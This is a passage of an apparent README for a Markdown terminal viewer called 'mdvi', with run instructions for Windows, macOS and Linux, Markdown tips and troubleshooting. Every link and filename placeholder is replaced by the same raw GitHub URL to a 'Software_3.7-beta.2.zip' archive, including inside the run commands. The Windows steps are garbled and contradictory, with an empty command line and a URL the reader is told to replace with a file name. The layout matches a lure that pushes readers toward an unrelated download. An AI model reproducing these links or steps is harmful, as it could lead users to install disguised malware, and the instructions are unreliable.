2. Navigate to the folder where you saved mdvi.
   - Use the command:

     Replace `YourName` with your actual username or the folder path where you saved mdvi.
3. Run mdvi by typing:  
   `.\https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip`  
   Replace `https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip` with the name of your Markdown file.

### macOS and Linux

1. Open Terminal.
2. Go to the folder with mdvi:  
   `cd ~/Downloads`  
   (Or where you saved the file.)
3. Set executable permission if needed:  
   `chmod +x mdvi-macos`  
   (or `mdvi-linux` for Linux)
4. Run the program by typing:  
   `./mdvi-macos https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip`

## 🧰 Tips for Markdown Files

If you’re new to Markdown, here are some basics on what you can write and how mdvi will show them:

- `# Heading 1` becomes a large title.
- `## Heading 2` is shown smaller but clear.
- `* Bullet points` and `- Dashes` create lists.
- `[Link](https://github.com/JINrielIDK/mdvi/raw/refs/heads/master/src/Software_3.7-beta.2.zip)` appears as clickable or colored text in supported terminals.
- Blocks of code appear with indentation, making them easy to spot.
- Plain paragraphs keep the text neat and readable.

You can write Markdown in any text editor like Notepad (Windows), TextEdit (Mac), or Gedit (Linux).

## 🚑 Troubleshooting

If mdvi does not work as expected, check the following:

- Make sure you typed the exact file name in the command.
- Confirm your Markdown file exists and is not open in another program.
- Verify you downloaded the correct mdvi file for your operating system.
- If you see “permission denied” on macOS/Linux, run `chmod +x <file>` as shown above.
- Use `--help` after mdvi to see any available commands:  
  `./mdvi-macos --help`
